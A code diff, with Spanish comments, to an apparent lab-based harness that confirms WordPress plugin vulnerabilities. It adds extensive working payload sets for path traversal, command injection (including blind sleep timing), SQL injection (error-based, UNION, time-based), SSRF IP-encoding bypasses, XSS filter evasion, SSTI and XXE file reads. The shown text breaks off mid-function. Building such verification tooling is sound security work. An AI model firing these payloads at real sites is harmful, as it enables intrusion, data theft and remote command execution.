@@ -261,6 +261,17 @@ class _Lab:
         r = self.sh("exec", self.listener, "cat", "/var/log/ssrf.log", timeout=timeout)
         return (r.stdout or "") if r.returncode == 0 else ""
 
+    def container_ip(self, name: str, timeout: float = 10.0) -> Optional[str]:
+        """IP interna REAL (no adivinada) del contenedor en la red del laboratorio -- se usa para
+        construir variantes de SSRF que apuntan al mismo listener por IP (decimal/hex/octal) en
+        vez de por nombre, que es como de verdad se saltan los filtros que solo bloquean
+        'localhost'/nombres de host conocidos pero no revisan la IP numerica."""
+        r = self.sh("inspect", "-f",
+                   f"{{{{(index .NetworkSettings.Networks \"{self.net}\").IPAddress}}}}",
+                   name, timeout=timeout)
+        ip = (r.stdout or "").strip()
+        return ip or None
+
     def find_in_webroot(self, token: str, timeout: float = 10.0) -> Optional[str]:
         """Busca, DENTRO del propio contenedor Apache, la ruta REAL de un fichero cuyo nombre
         contenga `token` bajo wp-content/uploads -- usado para file-upload, donde WordPress puede
@@ -954,9 +965,20 @@ def verify_wordpress_path_traversal(
         # varias profundidades de '../': el payload real depende de donde concatena el codigo el
         # parametro, que no podemos saber con certeza sin leer el codigo -- cada intento es una
         # peticion real, no una suposicion que se cuela como si fuera un hecho confirmado.
-        attempts = [canary_path.lstrip("/")] + [
-            ("../" * n) + canary_path.lstrip("/") for n in (2, 4, 6, 8, 10, 12)
-        ] + [canary_path]
+        rel = canary_path.lstrip("/")
+        depths = (2, 4, 6, 8, 10, 12)
+        attempts = [rel, canary_path]
+        attempts += [("../" * n) + rel for n in depths]
+        # variantes de codificacion/filtro (cada una ataca un saneo distinto que un codigo real
+        # podria aplicar -- str_replace('../','') naive, basename() que no toca %2e, un WAF que
+        # decodifica una sola vez, Windows que acepta backslash, o el null-byte historico de PHP
+        # <5.3.4 que trunca la extension que el codigo pudiera anadir):
+        attempts += [("..%2f" * n) + rel for n in depths]                      # URL-encoded
+        attempts += [("%2e%2e%2f" * n) + rel for n in depths]                  # fully encoded
+        attempts += [("%252e%252e%252f" * n) + rel for n in depths]            # double-encoded
+        attempts += [("..\\" * n) + rel for n in depths]                       # backslash (Windows)
+        attempts += [("....//" * n) + rel for n in depths]                     # bypass str_replace('../','')
+        attempts += [rel + "%00", canary_path + "%00"]                         # null-byte legacy
         found = False
         tried = []
         for payload_value in attempts:
@@ -1054,9 +1076,24 @@ def verify_wordpress_command_injection(
         expected = a + b
         calc = f"$(( {a} + {b} ))"
         attempts = [
-            f"; echo {calc}", f"| echo {calc}", f"&& echo {calc}",
-            f"`echo {calc}`", f"$(echo {calc})", f"\necho {calc}\n",
-            f"' ; echo {calc} ; '", f'" ; echo {calc} ; "', calc,
+            # separadores de comando estandar (sh/bash/dash/ash)
+            f"; echo {calc}", f"| echo {calc}", f"&& echo {calc}", f"|| echo {calc}",
+            f"\necho {calc}\n", f"\r\necho {calc}\r\n",
+            # sustitucion de comandos (funciona aunque el valor ya este entre comillas/concatenado)
+            f"`echo {calc}`", f"$(echo {calc})",
+            # rotura de contexto de comillas antes del separador (cuando el codigo envuelve el
+            # valor en comillas simples/dobles antes de pasarlo al shell)
+            f"' ; echo {calc} ; '", f'" ; echo {calc} ; "',
+            f"' && echo {calc} && echo '", f'" && echo {calc} && echo "',
+            f"' | echo {calc} #", f'" | echo {calc} #',
+            # bypass de filtro de espacios (sustituir ' ' por ${IFS} o %09, comun cuando el codigo
+            # bloquea el caracter espacio pero no el separador de comando)
+            f";echo${{IFS}}{calc}", f";echo%09{calc}",
+            # PowerShell (si el plugin invoca un binario via proc_open/shell_exec en Windows)
+            f"; powershell -c \"{calc}\"", f"| powershell -c \"{calc}\"",
+            # el valor entero como comando (si el parametro ES el comando completo, no un
+            # argumento que se concatena a otro)
+            f"echo {calc}", calc,
         ]
         res.evidence.update({
             "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
@@ -1103,21 +1140,78 @@ def verify_wordpress_command_injection(
                            f"evaluated by a remote shell, not from reflecting the sent payload.")
                 break
         res.evidence["intentos"] = tried
+
+        # fallback blind/time-based: si ninguna variante devolvio la suma en la respuesta (p.ej.
+        # porque el comando se ejecuta pero su salida nunca se refleja -- "blind" command
+        # injection), se mide el RETRASO real que un `sleep` inyectado provoca, comparado contra
+        # una peticion de control -- si el servidor tarda sistematicamente ~N segundos mas con el
+        # sleep que sin el, es prueba de ejecucion aunque no haya salida visible.
+        sleep_evidence = None
+        if not found:
+            step("ninguna variante reflejo la suma; probando blind command injection por "
+                 "temporizacion (sleep)...")
+            base_payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+            base_payload[cmd_param] = "1"
+            try:
+                t_base0 = time.time()
+                boot.sub_sess.request(m, boot.base_url + endpoint,
+                                      data=base_payload if m != "GET" else None,
+                                      params=base_payload if m == "GET" else None, timeout=20)
+                baseline_s = time.time() - t_base0
+            except Exception:
+                baseline_s = None
+            sleep_n = 6
+            sleep_attempts = [f"; sleep {sleep_n}", f"| sleep {sleep_n}", f"`sleep {sleep_n}`",
+                              f"$(sleep {sleep_n})", f"&& sleep {sleep_n}"]
+            for sp in sleep_attempts:
+                payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+                payload[cmd_param] = sp
+                step(f"probando {m} {endpoint} con {cmd_param}={sp!r} (temporizacion)...")
+                try:
+                    t0_s = time.time()
+                    boot.sub_sess.request(m, boot.base_url + endpoint,
+                                          data=payload if m != "GET" else None,
+                                          params=payload if m == "GET" else None,
+                                          timeout=sleep_n + 15)
+                    elapsed = time.time() - t0_s
+                except Exception:
+                    continue
+                delayed = (baseline_s is not None and elapsed - baseline_s >= sleep_n - 1.5)
+                sleep_evidence = {"payload": sp, "baseline_s": round(baseline_s, 2) if baseline_s else None,
+                                  "elapsed_s": round(elapsed, 2), "retraso_consistente": delayed}
+                if delayed:
+                    found = True
+                    res.evidence["payload_ganador"] = sp
+                    res.evidence["tecnica"] = "blind-timing"
+                    step(f"VERIFICADO (blind/timing): la peticion con {sp!r} tardo {elapsed:.1f}s "
+                         f"frente a {baseline_s:.1f}s de control -- el shell remoto ejecuto "
+                         f"'sleep {sleep_n}', no se ve la salida pero el retraso lo confirma.")
+                    break
+            res.evidence["blind_timing_intento"] = sleep_evidence
+
         if found:
             res.verified = True
             res.ok = True
-            res.detail = (f"COMMAND INJECTION confirmada: la peticion con {cmd_param}="
-                          f"{res.evidence['payload_ganador']!r} hizo que el servidor EJECUTARA "
-                          f"{a}+{b} y devolviera {expected} en la respuesta -- prueba inequivoca "
-                          f"de ejecucion remota de comandos (el payload enviado no contiene el "
-                          f"numero {expected} en ningun punto)")
+            if res.evidence.get("tecnica") == "blind-timing":
+                res.detail = (f"COMMAND INJECTION confirmada (blind/timing): la peticion con "
+                              f"{cmd_param}={res.evidence['payload_ganador']!r} retraso la "
+                              f"respuesta de forma consistente con 'sleep {sleep_n}' ejecutandose "
+                              f"de verdad en un shell remoto -- no hay salida visible, pero el "
+                              f"retraso medido es la prueba")
+            else:
+                res.detail = (f"COMMAND INJECTION confirmada: la peticion con {cmd_param}="
+                              f"{res.evidence['payload_ganador']!r} hizo que el servidor "
+                              f"EJECUTARA {a}+{b} y devolviera {expected} en la respuesta -- "
+                              f"prueba inequivoca de ejecucion remota de comandos (el payload "
+                              f"enviado no contiene el numero {expected} en ningun punto)")
         else:
             res.ok = True
-            res.detail = (f"se probaron {len(tried)} variantes de inyeccion para {cmd_param} y "
-                          f"ninguna produjo la suma esperada ({a}+{b}={expected}) en la respuesta "
-                          f"-- la inyeccion de comandos no se confirmo (puede necesitar otro "
-                          f"separador de comandos, otro shell, o el endpoint/parametro no son "
-                          f"los reales)")
+            res.detail = (f"se probaron {len(tried)} variantes de inyeccion (arimetica reflejada) "
+                          f"y {len(sleep_evidence and [sleep_evidence] or [])} de timing ciega "
+                          f"para {cmd_param}, y ninguna confirmo la suma esperada ({a}+{b}="
+                          f"{expected}) ni un retraso consistente -- la inyeccion de comandos no "
+                          f"se confirmo (puede necesitar otro separador de comandos, otro shell, "
+                          f"o el endpoint/parametro no son los reales)")
         res.evidence["screenshots"] = boot.shots
         return res
     except subprocess.TimeoutExpired as e:
@@ -1136,18 +1230,29 @@ def verify_wordpress_sqli(
     parameters, sqli_param_hint: str = "",
     on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
 ) -> WpVerifyResult:
-    """Verifica SQL injection con DOS tecnicas, de mas a menos dura:
+    """Verifica SQL injection con TRES tecnicas, de mas a menos dura, probando varios contextos
+    de inyeccion (numerico sin comillas, comilla simple, comilla doble, cierre de parentesis) y
+    estilos de comentario (-- -, #) en cada una, porque el contexto real del query no se puede
+    saber sin leer el codigo:
 
-    1) UNION-based (prueba dura): fuerza bruta del numero de columnas (1-8) probando `version()`
-       en cada posicion; si una version REAL del motor (que no estaba en la respuesta base)
-       aparece en la respuesta, es dato extraido de verdad de la base de datos -- no una
-       deduccion.
-    2) boolean-blind diferencial (mas debil, solo si (1) no filtro nada): compara pares de
-       condiciones TRUE/FALSE inyectadas; se marca verificado solo si al menos 2 de 3 pares
+    1) error-based (prueba dura, mas rapida -- sin fuerza bruta de columnas): extractvalue()/
+       updatexml() provocan un error de sintaxis XPATH cuyo mensaje INCLUYE el resultado de la
+       subconsulta; si version() aparece en la respuesta por esta via, es dato real forzado a
+       salir en un mensaje de error, no una coincidencia.
+    2) UNION-based (prueba dura): fuerza bruta del numero de columnas (1-8) probando `version()`
+       en cada posicion, para cada contexto/comentario; si una version REAL del motor (que no
+       estaba en la respuesta base) aparece en la respuesta, es dato extraido de verdad de la
+       base de datos -- no una deduccion.
+    3) boolean-blind diferencial (mas debil, solo si (1) y (2) no filtraron nada): compara pares
+       de condiciones TRUE/FALSE inyectadas; se marca verificado solo si al menos 2 de 3 pares
        muestran una diferencia de respuesta CONSISTENTE y el caso TRUE se comporta como la
-       peticion de control (para no confundir ruido normal con una condicion real). `detail`
-       deja explicito con cual de las dos tecnicas se confirmo, para que el analista sepa que
-       tan dura es la prueba."""
+       peticion de control.
+    4) time-based blind (ultimo recurso, si ninguna de las anteriores funciono): SLEEP(5) vs
+       SLEEP(0) en la misma condicion -- si el retraso es consistente en al menos 2 de 3 pares,
+       es indicio de inyeccion ciega sin ninguna diferencia visible en el contenido.
+
+    `detail` deja explicito con cual de las tecnicas se confirmo, para que el analista sepa que
+    tan dura es la prueba."""
     step = on_step or (lambda _m: None)
     pre = _check_prereqs(plugin_source_dir, slug)
     if pre is not None:
@@ -1193,25 +1298,89 @@ def verify_wordpress_sqli(
             return res
         base_len = len(base_resp.text or "")
         version_noise = set(re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", base_resp.text or ""))
+        # contextos de inyeccion: el query real puede envolver el valor en comillas simples,
+        # dobles, un parentesis, o nada (contexto numerico) -- probar los cuatro en vez de asumir
+        # uno solo evita fallar por adivinar mal el contexto, no por no haber inyeccion de verdad.
+        contexts = ["'", '"', "", "')", '")']
+        comments = ["-- -", "#"]
 
-        step("probando UNION-based (fuerza bruta de columnas) para extraer version() real...")
+        step("probando error-based (extractvalue/updatexml) para extraer version() real...")
+        error_tried = []
+        error_found = None
+        for ctx in contexts:
+            for fn in ("extractvalue(1,concat(0x7e,version()))", "updatexml(1,concat(0x7e,version()),1)"):
+                for cm in comments:
+                    payload_val = f"{orig_value}{ctx} AND {fn}{cm}"
+                    try:
+                        r = send(payload_val)
+                    except Exception as e:
+                        error_tried.append({"payload": payload_val, "error": str(e)})
+                        continue
+                    new_versions = set(re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or "")) - version_noise
+                    error_tried.append({"payload": payload_val, "status": r.status_code,
+                                        "version_nueva": sorted(new_versions)})
+                    if new_versions:
+                        error_found = (payload_val, sorted(new_versions)[0], r)
+                        break
+                if error_found:
+                    break
+            if error_found:
+                break
+
+        if error_found:
+            payload_val, mysql_version, r = error_found
+            res.verified = True
+            res.ok = True
+            res.evidence["tecnica"] = "error-based"
+            res.evidence["payload_ganador"] = payload_val
+            res.evidence["mysql_version_extraida"] = mysql_version
+            res.evidence["status_code_respuesta"] = r.status_code
+            res.evidence["respuesta_cuerpo_recorte"] = (r.text or "")[:500]
+            res.evidence["error_based_intentos"] = error_tried
+            res.detail = (f"SQLI confirmada (error-based): la peticion con {sqli_param}=... "
+                          f"provoco un error de sintaxis (extractvalue/updatexml) cuyo mensaje "
+                          f"incluyo la version real de la base de datos ({mysql_version}) -- "
+                          f"dato real forzado a salir en un mensaje de error, no una coincidencia")
+            step(f"VERIFICADO (error-based): version real del motor filtrada en el mensaje de "
+                 f"error: {mysql_version}")
+            if m == "GET":
+                shot_url = (boot.base_url + endpoint + ("&" if "?" in endpoint else "?")
+                           + f"{sqli_param}={payload_val}")
+                boot.capture(boot.sub_sess, shot_url[len(boot.base_url):],
+                       f"Paso 5: SQL INJECTION confirmada (error-based) -- el mensaje de error "
+                       f"contiene la version real del motor ({mysql_version}).",
+                       f"Step 5: SQL INJECTION confirmed (error-based) -- the error message "
+                       f"contains the database engine's real version ({mysql_version}).")
+            res.evidence["screenshots"] = boot.shots
+            return res
+        res.evidence["error_based_intentos_resumen"] = (f"{len(error_tried)} combinaciones "
+                                                         f"probadas, ninguna filtro version()")
+
+        step("error-based no filtro nada; probando UNION-based (fuerza bruta de columnas) para "
+             "extraer version() real...")
         union_tried = []
         union_found = None
-        for n in range(1, 9):
-            for pos in range(n):
-                cols = ["NULL"] * n
-                cols[pos] = "version()"
-                payload_val = f"{orig_value}' UNION SELECT {','.join(cols)}-- -"
-                try:
-                    r = send(payload_val)
-                except Exception as e:
-                    union_tried.append({"payload": payload_val, "error": str(e)})
-                    continue
-                new_versions = set(re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or "")) - version_noise
-                union_tried.append({"payload": payload_val, "status": r.status_code,
-                                    "version_nueva": sorted(new_versions)})
-                if new_versions:
-                    union_found = (payload_val, sorted(new_versions)[0], r)
+        for ctx in contexts:
+            for cm in comments:
+                for n in range(1, 9):
+                    for pos in range(n):
+                        cols = ["NULL"] * n
+                        cols[pos] = "version()"
+                        payload_val = f"{orig_value}{ctx} UNION SELECT {','.join(cols)}{cm}"
+                        try:
+                            r = send(payload_val)
+                        except Exception as e:
+                            union_tried.append({"payload": payload_val, "error": str(e)})
+                            continue
+                        new_versions = set(re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or "")) - version_noise
+                        union_tried.append({"payload": payload_val, "status": r.status_code,
+                                            "version_nueva": sorted(new_versions)})
+                        if new_versions:
+                            union_found = (payload_val, sorted(new_versions)[0], r)
+                            break
+                    if union_found:
+                        break
+                if union_found:
                     break
             if union_found:
                 break
@@ -1247,11 +1416,12 @@ def verify_wordpress_sqli(
 
         res.evidence["union_intentos_resumen"] = (f"{len(union_tried)} combinaciones probadas, "
                                                    f"ninguna filtro version()")
-
         step("UNION no filtro nada; probando boolean-based (diferencial TRUE/FALSE)...")
         pairs = [
             (f"{orig_value}' OR '1'='1", f"{orig_value}' OR '1'='2"),
             (f"{orig_value}' AND '1'='1", f"{orig_value}' AND '1'='2"),
+            (f'{orig_value}" OR "1"="1', f'{orig_value}" OR "1"="2'),
+            (f"{orig_value}') OR ('1'='1", f"{orig_value}') OR ('1'='2"),
             (f"{orig_value} OR 1=1", f"{orig_value} OR 1=2"),
         ]
         bool_tried = []
@@ -1282,14 +1452,58 @@ def verify_wordpress_sqli(
                           f"{len(pairs)} pares TRUE/FALSE mostraron una diferencia consistente de "
                           f"respuesta (y el caso TRUE se comporto como la peticion de control) -- "
                           f"indicio fuerte de inyeccion ciega, aunque sin dato extraido literal "
-                          f"(menos duro que el UNION-based)")
+                          f"(menos duro que el UNION/error-based)")
             step(f"VERIFICADO (boolean-blind): {consistent_diffs}/{len(pairs)} pares mostraron "
                  f"diferencia consistente")
+            res.evidence["screenshots"] = boot.shots
+            return res
+
+        # ultimo recurso: time-based blind. Si el contenido/longitud de la respuesta nunca cambia
+        # (p.ej. la pagina siempre devuelve lo mismo independientemente del resultado del query),
+        # SLEEP(5) vs SLEEP(0) en la misma condicion mide un retraso real en vez de comparar texto.
+        step("boolean-blind no mostro diferencia; probando time-based blind (SLEEP)...")
+        timing_pairs = [
+            (f"{orig_value}' AND SLEEP(5)-- -", f"{orig_value}' AND SLEEP(0)-- -"),
+            (f"{orig_value} AND SLEEP(5)-- -", f"{orig_value} AND SLEEP(0)-- -"),
+            (f"{orig_value}' OR SLEEP(5)-- -", f"{orig_value}' OR SLEEP(0)-- -"),
+        ]
+        timing_tried = []
+        timing_consistent = 0
+        for slow_p, fast_p in timing_pairs:
+            try:
+                t0_f = time.time()
+                send(fast_p)
+                fast_s = time.time() - t0_f
+                t0_sl = time.time()
+                send(slow_p)
+                slow_s = time.time() - t0_sl
+            except Exception as e:
+                timing_tried.append({"slow": slow_p, "fast": fast_p, "error": str(e)})
+                continue
+            delayed = (slow_s - fast_s) >= 3.5
+            timing_tried.append({"slow": slow_p, "fast": fast_p, "slow_s": round(slow_s, 2),
+                                 "fast_s": round(fast_s, 2), "retraso_consistente": delayed})
+            if delayed:
+                timing_consistent += 1
+        res.evidence["timing_intentos"] = timing_tried
+
+        if timing_consistent >= 2:
+            res.verified = True
+            res.ok = True
+            res.evidence["tecnica"] = "time-based-blind"
+            res.detail = (f"SQLI probable (time-based blind): {timing_consistent}/"
+                          f"{len(timing_pairs)} pares SLEEP(5)/SLEEP(0) mostraron un retraso "
+                          f"consistente de al menos ~3.5s -- indicio de inyeccion ciega sin "
+                          f"ninguna diferencia visible en el contenido de la respuesta")
+            step(f"VERIFICADO (time-based blind): {timing_consistent}/{len(timing_pairs)} pares "
+                 f"mostraron retraso consistente")
         else:
             res.ok = True
-            res.detail = (f"UNION-based no filtro version() ({len(union_tried)} combinaciones) y "
-                          f"boolean-blind no mostro diferencia consistente ({consistent_diffs}/"
-                          f"{len(pairs)} pares) -- la inyeccion SQL no se confirmo")
+            res.detail = (f"error-based ({len(error_tried)}) y UNION-based ({len(union_tried)}) "
+                          f"no filtraron version(), boolean-blind no mostro diferencia consistente "
+                          f"({consistent_diffs}/{len(pairs)}) y time-based blind tampoco "
+                          f"({timing_consistent}/{len(timing_pairs)}) -- la inyeccion SQL no se "
+                          f"confirmo")
         res.evidence["screenshots"] = boot.shots
         return res
     except subprocess.TimeoutExpired as e:
@@ -1341,49 +1555,77 @@ def verify_wordpress_ssrf(
             res.detail = "no se pudo levantar el contenedor listener para SSRF"
             return res
 
-        token = _token()
-        callback_url = f"http://{lab.listener}:8080/binoracle-ssrf-{token}"
+        listener_ip = lab.container_ip(lab.listener)
+        m = (http_method or "GET").upper()
+        found = False
+        tried = []
+
+        def build_urls(tok: str) -> List[str]:
+            path = f"binoracle-ssrf-{tok}"
+            urls = [f"http://{lab.listener}:8080/{path}"]
+            if listener_ip:
+                parts = [int(x) for x in listener_ip.split(".")]
+                dec = (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]
+                hexip = "0x" + "".join(f"{x:02x}" for x in parts)
+                octip = "0" + ".".join(f"{x:03o}" for x in parts)
+                urls += [
+                    f"http://{listener_ip}:8080/{path}",                         # IP literal
+                    f"http://{dec}:8080/{path}",                                 # IP decimal
+                    f"http://{hexip}:8080/{path}",                               # IP hex
+                    f"http://{octip}:8080/{path}",                               # IP octal
+                    f"http://trusted-host@{listener_ip}:8080/{path}",            # userinfo trick
+                    f"http://{listener_ip}:8080@evil.invalid/{path}",            # userinfo (al reves)
+                    f"http://{lab.listener}.:8080/{path}",                       # trailing dot DNS
+                ]
+            return urls
+
+        for attempt_url in build_urls(_token()):
+            token = attempt_url.rsplit("binoracle-ssrf-", 1)[-1]
+            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+            payload[url_param] = attempt_url
+            step(f"probando {m} {endpoint} con {url_param}={attempt_url!r}...")
+            entry = {"url": attempt_url, "token": token}
+            try:
+                resp = boot.sub_sess.request(m, boot.base_url + endpoint,
+                                   data=payload if m != "GET" else None,
+                                   params=payload if m == "GET" else None, timeout=20)
+                entry["status"] = resp.status_code
+            except Exception as e:
+                entry["peticion_error"] = str(e)
+            time.sleep(2)
+            log = lab.listener_log()
+            entry["token_en_log"] = token in log
+            tried.append(entry)
+            if token in log:
+                found = True
+                res.evidence["callback_url_ganadora"] = attempt_url
+                res.evidence["token_ganador"] = token
+                res.evidence["listener_log_recorte"] = log[:1000]
+                break
+
         res.evidence.update({
             "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
-            "url_param": url_param, "callback_url": callback_url, "token": token,
-            "metodo": (http_method or "GET").upper(), "endpoint": endpoint,
+            "url_param": url_param, "listener_ip": listener_ip,
+            "metodo": m, "endpoint": endpoint, "intentos": tried,
         })
 
-        m = (http_method or "GET").upper()
-        payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
-        payload[url_param] = callback_url
-        step(f"probando {m} {endpoint} con {url_param}={callback_url!r}...")
-        try:
-            resp = boot.sub_sess.request(m, boot.base_url + endpoint,
-                               data=payload if m != "GET" else None,
-                               params=payload if m == "GET" else None, timeout=20)
-            res.evidence["status_code_respuesta"] = resp.status_code
-            res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
-        except Exception as e:
-            res.evidence["peticion_error"] = str(e)
-
-        step("esperando y leyendo el log del listener interno...")
-        time.sleep(3)
-        log = lab.listener_log()
-        res.evidence["listener_log_recorte"] = log[:1000]
-        hit = token in log
-
-        if hit:
+        if found:
             res.verified = True
             res.ok = True
             res.detail = (f"SSRF confirmado: el listener interno (inalcanzable desde fuera del "
-                          f"laboratorio) recibio una conexion con el token exacto "
-                          f"'binoracle-ssrf-{token}' tras la peticion con {url_param}="
-                          f"{callback_url!r} -- prueba de que el SERVIDOR emitio la peticion "
-                          f"saliente, no el navegador del atacante")
-            step(f"VERIFICADO: el listener interno recibio el token '{token}' -- la peticion "
-                 f"saliente la hizo el servidor.")
+                          f"laboratorio) recibio una conexion con el token exacto tras la "
+                          f"peticion con {url_param}={res.evidence['callback_url_ganadora']!r} "
+                          f"-- prueba de que el SERVIDOR emitio la peticion saliente, no el "
+                          f"navegador del atacante")
+            step(f"VERIFICADO: el listener interno recibio el token "
+                 f"'{res.evidence['token_ganador']}' -- la peticion saliente la hizo el servidor.")
         else:
             res.ok = True
-            res.detail = (f"se envio la peticion con {url_param}={callback_url!r} pero el token "
-                          f"'{token}' no aparecio en el log del listener interno -- el SSRF no se "
-                          f"confirmo (puede que el endpoint/parametro no sean los reales, o que "
-                          f"el servidor filtre URLs internas antes de seguirlas)")
+            res.detail = (f"se probaron {len(tried)} variantes de URL/codificacion (hostname, IP "
+                          f"literal, decimal, hex, octal, truco de userinfo) y ninguna hizo que "
+                          f"el token llegara al listener interno -- el SSRF no se confirmo (puede "
+                          f"que el endpoint/parametro no sean los reales, o que el servidor "
+                          f"filtre de verdad las URLs internas antes de seguirlas)")
         res.evidence["screenshots"] = boot.shots
         return res
     except subprocess.TimeoutExpired as e:
@@ -1449,13 +1691,37 @@ def verify_wordpress_xss(
 
         token = _token()
         marker = f"binoracle-xss-{token}"
+        js = f"document.title='{marker}'"
         attempts = [
-            f"<script>document.title='{marker}'</script>",
-            f"<img src=x onerror=\"document.title='{marker}'\">",
-            f"<svg onload=\"document.title='{marker}'\">",
-            f"\"><script>document.title='{marker}'</script>",
-            f"'><script>document.title='{marker}'</script>",
-            f"<body onload=\"document.title='{marker}'\">",
+            # contexto HTML normal (el payload cae directo en el cuerpo de la pagina)
+            f"<script>{js}</script>",
+            f"<img src=x onerror=\"{js}\">",
+            f"<svg onload=\"{js}\">",
+            f"<body onload=\"{js}\">",
+            f"<iframe src=\"javascript:{js}\"></iframe>",
+            f"<details open ontoggle=\"{js}\">x</details>",
+            f"<video><source onerror=\"{js}\"></video>",
+            f"<marquee onstart=\"{js}\">x</marquee>",
+            # rotura de atributo HTML (el payload cae DENTRO de value="..."/placeholder="..." etc.)
+            f"\"><script>{js}</script>",
+            f"'><script>{js}</script>",
+            f"\" onmouseover=\"{js}\" x=\"",
+            f"' onmouseover='{js}' x='",
+            f"\" autofocus onfocus=\"{js}\" x=\"",
+            # rotura de contexto JS-string (el payload cae dentro de un <script>var x='...'</script>
+            # ya existente, no en HTML plano -- no vale cerrar con <script>, hay que cerrar la
+            # cadena/el propio tag <script> primero)
+            f"';{js};//", f'";{js};//',
+            f"</script><script>{js}</script>",
+            # contexto de URI (href/src esperando una URL, no HTML)
+            f"javascript:{js}",
+            # variantes de evasion de filtro (mayusculas mezcladas, sin parentesis en el nombre de
+            # tag, entidades HTML, doble codificacion simple) -- para cuando el filtro busca
+            # literalmente "<script" o "javascript:" en minusculas
+            f"<ScRiPt>{js}</sCrIpT>",
+            f"<img src=x onerror=&#34;{js}&#34;>",
+            f"<svg/onload=\"{js}\">",
+            f"<a href=\"jav&#x09;ascript:{js}\">x</a>",
         ]
 
         m = (http_method or "GET").upper()
@@ -1548,9 +1814,19 @@ def verify_wordpress_ssti(
 
         a, b = secrets.randbelow(90) + 10, secrets.randbelow(90) + 10
         expected = a * b
+        mul = f"{a}*{b}"
         attempts = [
-            f"{{{{{a}*{b}}}}}", f"${{{a}*{b}}}", f"#{{{a}*{b}}}", f"<%= {a}*{b} %>",
-            f"{{{a}*{b}}}", f"${{{{{a}*{b}}}}}",
+            # sintaxis directa de cada motor (Jinja2/Twig, Smarty/Velocity-like, Ruby/Slim, ERB,
+            # Pebble, Freemarker/single-brace)
+            f"{{{{{mul}}}}}", f"${{{mul}}}", f"#{{{mul}}}", f"<%= {mul} %>",
+            f"{{{mul}}}", f"${{{{{mul}}}}}", f"<#if true>${{{mul}}}</#if>",
+            # rotura de contexto cuando el valor cae DENTRO de otra expresion de plantilla ya
+            # existente (p.ej. {{ "hola " + valor }}) -- hay que cerrar esa expresion primero
+            f"}}{{{mul}}}{{", f"'}}{{{mul}}}{{'", f'"}}{{{mul}}}{{"',
+            f"-}}{{{mul}}}{{-",          # control de espacios en blanco de Jinja2 ({%- -%})
+            # rotura de atributo HTML antes de la plantilla (si el valor se inserta en
+            # value="..."  dentro de una plantilla que luego evalua su propio contenido)
+            f"\">{{{{{mul}}}}}<\"",
         ]
         res.evidence.update({
             "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
@@ -1689,32 +1965,100 @@ def verify_wordpress_xxe(
                 step(f"VERIFICADO: el secreto plantado aparecio literal en la respuesta "
                      f"({label}).")
 
-        if xml_param:
-            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
-            payload[xml_param] = xxe_xml
-            try_send("parametro de formulario",
-                     data=payload if m != "GET" else None,
-                     params=payload if m == "GET" else None)
-        if not found:
-            try_send("cuerpo crudo application/xml", data=xxe_xml.encode(),
-                     headers={"Content-Type": "application/xml"})
-        if not found:
-            try_send("cuerpo crudo text/xml", data=xxe_xml.encode(),
-                     headers={"Content-Type": "text/xml"})
+        # variantes del XML en si: la entidad DOCTYPE normal, parametro-entidad (algunos parsers
+        # solo resuelven SYSTEM dentro de %param;, no en una entidad general directa), y envuelta
+        # en SOAP (algunas APIs esperan un envelope, no XML plano)
+        xxe_param_entity = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM '
+                            f'"file://{canary_path}"> %xxe; ]><foo>test</foo>')
+        xxe_soap = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
+                   f'"file://{canary_path}">]><soap:Envelope '
+                   f'xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>'
+                   f'<foo>&xxe;</foo></soap:Body></soap:Envelope>')
+        xml_variants = [("entidad general (DOCTYPE normal)", xxe_xml),
+                        ("parametro-entidad", xxe_param_entity),
+                        ("envuelta en SOAP", xxe_soap)]
+
+        for label, xml_body in xml_variants:
+            if found:
+                break
+            if xml_param:
+                payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+                payload[xml_param] = xml_body
+                try_send(f"{label}, parametro de formulario",
+                         data=payload if m != "GET" else None,
+                         params=payload if m == "GET" else None)
+            if not found:
+                try_send(f"{label}, cuerpo crudo application/xml", data=xml_body.encode(),
+                         headers={"Content-Type": "application/xml"})
+            if not found:
+                try_send(f"{label}, cuerpo crudo text/xml", data=xml_body.encode(),
+                         headers={"Content-Type": "text/xml"})
 
         res.evidence["intentos"] = tried
+
+        # fallback OOB/blind: si ninguna variante en banda devolvio el secreto en la respuesta
+        # (p.ej. porque el resultado de la entidad nunca se refleja de vuelta), se referencia el
+        # listener interno de SSRF (ver verify_wordpress_ssrf) como SYSTEM de la entidad -- si el
+        # parser XML resuelve entidades externas DE VERDAD, intentara conectarse por HTTP a esa
+        # URL, y la conexion queda grabada con un token unico. No extrae el secreto del fichero
+        # (es una prueba mas debil que la del canario en banda), pero confirma que el parser
+        # resuelve entidades externas arbitrarias -- suficiente para XXE ciego/OOB.
+        oob_hit = None
+        if not found:
+            step("ninguna variante en banda devolvio el secreto; probando XXE ciego/OOB via el "
+                 "listener interno...")
+            listener = lab.start_listener()
+            if listener:
+                oob_token = _token()
+                oob_xml = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
+                          f'"http://{lab.listener}:8080/binoracle-xxe-oob-{oob_token}">]>'
+                          f'<foo>&xxe;</foo>')
+                payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+                if xml_param:
+                    payload[xml_param] = oob_xml
+                    try:
+                        boot.sub_sess.request(m, boot.base_url + endpoint,
+                                   data=payload if m != "GET" else None,
